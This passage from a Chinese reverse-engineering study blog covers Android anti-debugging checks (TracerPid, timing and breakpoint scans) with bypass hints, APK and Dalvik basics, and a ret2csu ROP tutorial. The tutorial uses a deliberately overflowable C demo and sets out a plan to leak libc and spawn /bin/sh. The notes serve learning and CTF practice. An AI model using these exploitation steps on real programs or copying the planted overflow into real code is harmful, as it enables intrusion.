<p>检测时只需读取此处的pid判断是否为空，如果不为空再查询此pid对应的是什么进程。如果是android_server这样的与调试相关进程，则直接杀死当前进程阻止调试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">coursecheck</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">char</span> filename[bufsize];</span><br><span class="line">    <span class="keyword">char</span> line[bufsize];</span><br><span class="line">    <span class="keyword">char</span> name[bufsize];</span><br><span class="line">    <span class="keyword">char</span> nameline[bufsize];</span><br><span class="line">    <span class="keyword">int</span> pid = getpid();</span><br><span class="line">    <span class="comment">//先读取Tracepid的值</span></span><br><span class="line">    <span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/status&quot;</span>, pid);</span><br><span class="line">    FILE *fd=fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">while</span>(fgets(line,bufsize,fd))</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;TracerPid&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> statue =atoi(&amp;line[<span class="number">10</span>]);</span><br><span class="line">                <span class="keyword">if</span>(statue!=<span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">                    <span class="built_in">sprintf</span>(name,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,statue);</span><br><span class="line">                    FILE *fdname=fopen(name,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(fdname!= <span class="literal">NULL</span>)</span><br><span class="line">					&#123;</span><br><span class="line">                        <span class="keyword">while</span>(fgets(nameline,bufsize,fdname))</span><br><span class="line">						&#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="built_in">strstr</span>(nameline,<span class="string">&quot;android_server&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">							&#123;</span><br><span class="line">                                <span class="keyword">int</span> ret=kill(pid,SIGKILL);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    fclose(fdname);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="轮询检测"><a href="#轮询检测" class="headerlink" title="轮询检测"></a>轮询检测</h2><p>循环检测当前进程状态文件，即 ，判断tracerid字段是否为0，若不为0则判定进程处于被debug状态，进而关闭进程。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LtCm6.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LtCm6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h2 id="Self-Debugging"><a href="#Self-Debugging" class="headerlink" title="Self-Debugging"></a>Self-Debugging</h2><p>当前进程fork()得到子进程后，子进程对父进程进行debug，由于父进程被占用(进程同一时间只能被一个进程attach)，使得其他程序无法直接对父进程进行debug。</p>
<p>解决方法：通过debug子进程来间接debug父进程。</p>
<h2 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h2><p>根据模拟器的特征，程序可以判断自身是否运行于模拟器中。特征值大致有下面这些：</p>
<ol>
<li>Device ID - 设备序列号</li>
<li>电话号码</li>
<li>IMSI识别码</li>
<li>运营商名称</li>
<li>QEMU相关的二进制文件</li>
<li>CPU信息</li>
</ol>
<p>除此之外的<a href="https://bbs.pediy.com/thread-225717.html">模拟器检测方法</a>还有很多。</p>
<h2 id="Java层反调试"><a href="#Java层反调试" class="headerlink" title="Java层反调试"></a>Java层反调试</h2><h3 id="0x00-Debug条件"><a href="#0x00-Debug条件" class="headerlink" title="0x00.Debug条件"></a>0x00.Debug条件</h3><ul>
<li><p>apk中的AndroidMainfest.xml中，application标签下有该属性：</p>
  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Android:debuggable=true</span><br></pre></td></tr></table></figure></li>
<li><p>设备可调试，即拥有如下属性：</p>
  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">ro.debugable=1</span><br></pre></td></tr></table></figure>

<p>  该属性又位于boot.img镜像中的/default.prop文件中，前者在设备开机前由ramdisk 挂载。因此可以修改boot.img从而修改ro.debugable属性使得设备全局可调试。<a href="https://www.cnblogs.com/codex/p/12250647.html">该项修改</a>可通过Magisk及其模块MagiskHide Props Config实现。</p>
</li>
</ul>
<h3 id="0x01-isDebuggerConnected"><a href="#0x01-isDebuggerConnected" class="headerlink" title="0x01.isDebuggerConnected()"></a>0x01.isDebuggerConnected()</h3><p>Android SDK中的android.os.debug类提供了一个isDebuggerConnected方法，该方法用于判断JDWP调试器是否正在工作。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LYmZT.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LYmZT.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>可通过修改smali代码进行绕过。</p>
<h3 id="0x02-时间戳检测"><a href="#0x02-时间戳检测" class="headerlink" title="0x02.时间戳检测"></a>0x02.时间戳检测</h3><p>正常情况下程序运行时取两个时间戳，两者差值较小。但若是在debug状态下，时间差值会超出正常值，若排除程序卡顿已经bug的情况下可以断定app处于debug状态。Exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">jint <span class="title">anti_time</span><span class="params">()</span></span>&#123;</span><br><span class="line">	 <span class="keyword">int</span> pid = getpid();</span><br><span class="line">	 struct timeval t1;</span><br><span class="line">	 struct timeval t2;</span><br><span class="line">	 struct timezone tz;</span><br><span class="line">	 gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">	 gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">	 <span class="keyword">int</span> timeoff = (t2.tv_sec) - (t1.tv_sec);</span><br><span class="line">	 LOGD(<span class="string">&quot;time %d&quot;</span>,timeoff);</span><br><span class="line">	 <span class="keyword">if</span> (timeoff &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> ret = kill(pid, SIGKILL);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="0x03-断点检测"><a href="#0x03-断点检测" class="headerlink" title="0x03.断点检测"></a>0x03.断点检测</h3><p>程序运行过程会将elf文件(使用so的情况下)导入导入内存中，如果存在断点，内存中也会改变相应的指令，留下thumb或者arm的断点指令的机器码。利用指针遍历内存中elf文件判断有无上述机器码，即可判断有无断点，进而判断是否处于debug。Exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">jint <span class="title">anti_breakpoint</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Elf32_Ehdr *elfhdr;</span><br><span class="line">	Elf32_Phdr *pht;</span><br><span class="line">	unsigned <span class="keyword">int</span> size, base, offset,phtable;</span><br><span class="line">	<span class="keyword">int</span> n, i,j;</span><br><span class="line">	<span class="keyword">char</span> *p;</span><br><span class="line">	<span class="comment">//从maps中读取elf文件在内存中的起始地址</span></span><br><span class="line">	base = GetLibAddr();</span><br><span class="line">	<span class="keyword">if</span>(base == <span class="number">0</span>)&#123;</span><br><span class="line">		LOGD(<span class="string">&quot;find base error/n&quot;</span>);</span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	elfhdr = (Elf32_Ehdr *) base;</span><br><span class="line">	phtable = elfhdr-&gt;e_phoff + base;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;elfhdr-&gt;e_phnum;i++)&#123;</span><br><span class="line">		pht = (Elf32_Phdr*)(phtable+i*sizeof(Elf32_Phdr));</span><br><span class="line">	    <span class="keyword">if</span>(pht-&gt;p_flags&amp;<span class="number">1</span>)&#123;</span><br><span class="line">	    	offset = pht-&gt;p_vaddr + base + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr)*elfhdr-&gt;e_phnum;</span><br><span class="line">	        LOGD(<span class="string">&quot;offset:%#x ,len:%#x&quot;</span>,offset,pht-&gt;p_memsz);</span><br><span class="line">	        p = (<span class="keyword">char</span>*)offset;</span><br><span class="line">	        size = pht-&gt;p_memsz;</span><br><span class="line">	        <span class="keyword">for</span>(j=<span class="number">0</span>,n=<span class="number">0</span>;j&lt;size;++j,++p)&#123;</span><br><span class="line">	        	<span class="keyword">if</span>(*p == <span class="number">0x10</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0xde</span>)&#123;</span><br><span class="line">	        		n++;</span><br><span class="line">	                LOGD(<span class="string">&quot;### find thumb bpt %#x /n&quot;</span>,p);</span><br><span class="line">	                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(*p == <span class="number">0xf0</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0xf7</span> &amp;&amp; *(p+<span class="number">2</span>) == <span class="number">0x00</span> &amp;&amp; *(p+<span class="number">3</span>) == <span class="number">0xa0</span>)&#123;</span><br><span class="line">	                n++;</span><br><span class="line">	                LOGD(<span class="string">&quot;### find thumb2 bpt %#x /n&quot;</span>,p);</span><br><span class="line">	                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(*p == <span class="number">0x01</span> &amp;&amp; *(p+<span class="number">1</span>) == <span class="number">0x00</span> &amp;&amp; *(p+<span class="number">2</span>) == <span class="number">0x9f</span> &amp;&amp; *(p+<span class="number">3</span>) == <span class="number">0xef</span>)&#123;</span><br><span class="line">	                n++;</span><br><span class="line">	                LOGD(<span class="string">&quot;### find arm bpt %#x /n&quot;</span>,p);</span><br><span class="line">	                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125;</span><br><span class="line">	        LOGD(<span class="string">&quot;### find breakpoint num: %d/n&quot;</span>,n);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>AndroidRe</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Android基础</title>
    <url>/2021/02/12/Android%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>补充一些关于Android的系统知识。<span id="more"></span></p>
<h2 id="APK包结构"><a href="#APK包结构" class="headerlink" title="APK包结构"></a>APK包结构</h2><table>
<thead>
<tr>
<th>Filename</th>
<th>Property</th>
</tr>
</thead>
<tbody><tr>
<td>assets</td>
<td>静态资源（图片，配置文件，html5离线资源）任意深度子目录</td>
</tr>
<tr>
<td>res</td>
<td>程序资源（图片，图标，字符串）拥有对应资源id，关联代码R.java</td>
</tr>
<tr>
<td>lib</td>
<td>依赖库（当前app用到的so）</td>
</tr>
<tr>
<td>META-INF</td>
<td>证书签名文件</td>
</tr>
<tr>
<td>.dex</td>
<td>可执行文件（方法数&gt;2¹⁶时分包）</td>
</tr>
<tr>
<td>AndroidManifest.xml</td>
<td>项目的系统清单（配置、四大组件的声明）</td>
</tr>
<tr>
<td>resources.arsc</td>
<td>资源索引表</td>
</tr>
</tbody></table>
<h2 id="Android打包流程"><a href="#Android打包流程" class="headerlink" title="Android打包流程"></a>Android打包流程</h2><p><img src="https://z3.ax1x.com/2021/03/25/6LmyL9.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmyL9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:56%;" /><img src="https://z3.ax1x.com/2021/03/25/6LmrM4.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmrM4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" /></p>
<p>1.资源→源码</p>
<p>2.接口→源码</p>
<p>3.源码→字节码</p>
<p>4.字节码→可执行</p>
<p>5.可执行→apk</p>
<p>6.apk签名</p>
<p>7.apk对齐压缩</p>
<h2 id="APK安装流程"><a href="#APK安装流程" class="headerlink" title="APK安装流程"></a>APK安装流程</h2><p><img src="https://z3.ax1x.com/2021/03/25/6LmBzF.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmBzF.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>1.在/data/app创建以apk包名命名的文件夹，并将apk解压至此</p>
<p>2.在/data/data创建以apk包名命名的文件夹，解析AndroidManifest.xml并上述文件夹写入应用数据</p>
<p>3.优化dex文件，保存于”/data/dalvik-cache/profiles/“+apk包名</p>
<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><table>
<thead>
<tr>
<th>类型</th>
<th>运行</th>
<th>机制</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>java虚拟机</td>
<td>Java字节码(.class)</td>
<td>略</td>
<td>基于栈架构</td>
</tr>
<tr>
<td>Dalvik虚拟机</td>
<td>DEX字节码（.odex）</td>
<td>jit编译机制</td>
<td>基于寄存器架构（≤Android 5.0）</td>
</tr>
<tr>
<td>ART虚拟机</td>
<td>DEX字节码（.oat）</td>
<td>aot编译机制</td>
<td>基于寄存器架构（&gt;Android 5.0）</td>
</tr>
</tbody></table>
<p><img src="https://z3.ax1x.com/2021/03/25/6LmssJ.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LmssJ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h2 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h2><h3 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h3><table>
<thead>
<tr>
<th>Name</th>
<th align="center">What for</th>
</tr>
</thead>
<tbody><tr>
<td>活动(Activity)</td>
<td align="center">表现功能，可视化的指令操作窗口</td>
</tr>
<tr>
<td>服务(Services)</td>
<td align="center">长期后台执行，无交互</td>
</tr>
<tr>
<td>广播接收者(Broadcast Recive)</td>
<td align="center">接收其他应用程序的广播信息</td>
</tr>
<tr>
<td>内容提供者(Content Provider)</td>
<td align="center">数据集，由多个应用程序共享使用</td>
</tr>
</tbody></table>
<h2 id="Activity生命周期"><a href="#Activity生命周期" class="headerlink" title="Activity生命周期"></a>Activity生命周期</h2><p><img src="https://z3.ax1x.com/2021/03/25/6Lm0RU.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6Lm0RU.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
]]></content>
      <tags>
        <tag>AndroidRe</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Dalvik字节码</title>
    <url>/2021/02/21/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<p>看懂Dalvik字节码，看懂Smali文件。<span id="more"></span></p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>存储变量≤32位，用1个寄存器</p>
<p>存储变量64位，用2个相邻寄存器</p>
<h2 id="寄存器命名法"><a href="#寄存器命名法" class="headerlink" title="寄存器命名法"></a>寄存器命名法</h2><h3 id="v命名法"><a href="#v命名法" class="headerlink" title="v命名法"></a>v命名法</h3><p>局部变量：M个  使用寄存器：v0~vM-1</p>
<p>传入参数：N个  使用寄存器：vM~vM+N-1</p>
<p><img src="https://img-blog.csdn.net/20160731141440713" class="lazyload" data-srcset="https://img-blog.csdn.net/20160731141440713" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h3 id="p命名法"><a href="#p命名法" class="headerlink" title="p命名法"></a>p命名法</h3><p>局部变量：M个  使用寄存器：v0~vM-1</p>
<p>传入参数：N个  使用寄存器：p0~pN-1</p>
<p><img src="https://img-blog.csdn.net/20160731142057192" class="lazyload" data-srcset="https://img-blog.csdn.net/20160731142057192" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LK2on.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LK2on.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h2 id="smali数据类型"><a href="#smali数据类型" class="headerlink" title="smali数据类型"></a>smali数据类型</h2><p><img src="https://z3.ax1x.com/2021/03/25/6LKgds.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LKgds.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h2 id="字段与函数分析"><a href="#字段与函数分析" class="headerlink" title="字段与函数分析"></a>字段与函数分析</h2><h3 id="字段格式"><a href="#字段格式" class="headerlink" title="字段格式"></a>字段格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<p>分析为java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Lpackage.name</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectName</span></span>&#123;</span><br><span class="line">	String FieldName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数格式"><a href="#函数格式" class="headerlink" title="函数格式"></a>函数格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;MethodName(III)Z</span><br></pre></td></tr></table></figure>

<p>分析为java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Lpackage.name</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectName</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Boolean <span class="title">MethodName</span><span class="params">(<span class="keyword">int</span> ,<span class="keyword">int</span> ,<span class="keyword">int</span> )</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Dalvik指令格式"><a href="#Dalvik指令格式" class="headerlink" title="Dalvik指令格式"></a>Dalvik指令格式</h2><blockquote>
<p>格式：基础字节码-名称后缀/字节码后缀  目的寄存器  源寄存器</p>
</blockquote>
<blockquote>
<p>exp：       move    - wide     /     from16           vAA     ,  vBBBB</p>
</blockquote>
<ul>
<li>其中move为基础字节码，opcode</li>
<li>wide为名称后缀,标识指令操作的数据宽度为64位。</li>
<li>from16为字节码后缀,标识源为一个16位的寄存器引用变量</li>
<li>vAA为目的寄存器,它始终在源的前面，取值范围为v0~v255</li>
<li>vBBBB为源寄存器，取值范围为v0~v65535</li>
</ul>
]]></content>
      <tags>
        <tag>AndroidRe</tag>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Intermediate ROP</title>
    <url>/2020/08/19/Intermediate_ROP/</url>
    <content><![CDATA[<p>​        Ret2csu &amp; BROP <span id="more"></span></p>
<h2 id="0x00-ret2csu"><a href="#0x00-ret2csu" class="headerlink" title="0x00 . ret2csu"></a>0x00 . ret2csu</h2><h3 id="A-原理"><a href="#A-原理" class="headerlink" title="A . 原理"></a>A . 原理</h3><p>​        这个技术算是一个通用的rop技术，用到了__libc_csu_init()这个函数，只要程序调用了库函数就一定需要调用这个函数对库进行初始化。</p>
<p>​        写一个简单demo：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//level5.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        关闭canary，关闭pie进行64位编译。然后利用objdump命令，可以看到各个段反汇编的情况：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie level5.c -o level5</span><br><span class="line">objdump -d level5</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819170901.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819170901.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        仔细观察这个函数，我们可以发现一下有用的gadget：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819171605.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819171605.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/>

<p>​        如果我们能构造rop链，使得系统先执行1，再执行2，那么就可以控制rdi，rsi，rdx三个寄存器。在1处，我们发现了6个弹栈操作，系统将栈上数据储存到寄存器中，而后在2处我们又通过这些寄存器给rdi，rsi，rdx进行了赋值。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819172139.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819172139.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/>

<p>​        因为反汇编的偏差，在ida中看0x4005D9，发现系统随后调用了rbx*8+r12这个地址。我们可以通过控制这两个寄存器来控制调用地址，进而实现攻击或者数据泄露。</p>
<p>​        完整流程如下：</p>
<ol>
<li>程序通过溢出跳转到1开始执行。</li>
<li>程序执行到0x4005F4处的ret，返回到我们通过溢出而预设的返回地址，即2处。</li>
<li>程序从2处一直往下执行，0x4005D9处调用完函数后返回到0x4005DD继续执行。</li>
<li>执行0x4005DD，使得rbx寄存器+1，接着比较rbx，rbp，如果相等则不跳转，接着往下执行。因此这里我们需要预设寄存器的值使得rbx，rbp满足不跳转的条件。也就是要让rbx+1 == rbp。</li>
<li>再次执行到0x4005F4处的ret，rop链结束。</li>
</ol>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819190913.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200819190913.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>​        当然，该技术也有一些需要注意的点：</p>
<ol>
<li>0x4005D6中的赋值只是对edi赋值，也就是说仅改变了rdi寄存器的低32位，如果rdi本身数值过大，则需要另外找gadget。</li>
<li>为了让rbx+1 == rbp，我们可以简单地设置让rbx = 0，rbp = 1。</li>
<li>因为需要两次经过1处，所以后一次经过的时候也需要设置6个寄存器的值(垃圾值即可)，然后再加上最后的返回地址，来避免程序崩溃。</li>
</ol>
<h3 id="B-示例"><a href="#B-示例" class="headerlink" title="B . 示例"></a>B . 示例</h3><p>​        用level5解题进行演示。</p>
<p>​        既然有gadget了，那么思路就比较清晰了：</p>
<ol>
<li>通过ret2csu设置rbx为0，rbp为1，r12为需要执行的函数地址，r13，r14，r15，分别为r12函数的参数，ret设置返回地址，比如main。</li>
<li>第一次ret2csu，将write_got写入rop链，泄露出write的真实地址，再计算libc和其他所需地址。</li>
<li>第二次ret2csu，将read_got写入rop链，将system地址和”/bin/sh”字符串写入到bss段。</li>
<li>第三次ret2csu，将bss_addr写入rop链，参数为bss_addr + 8，则执行execve(“/bin/sh”,0,0);</li>
</ol>
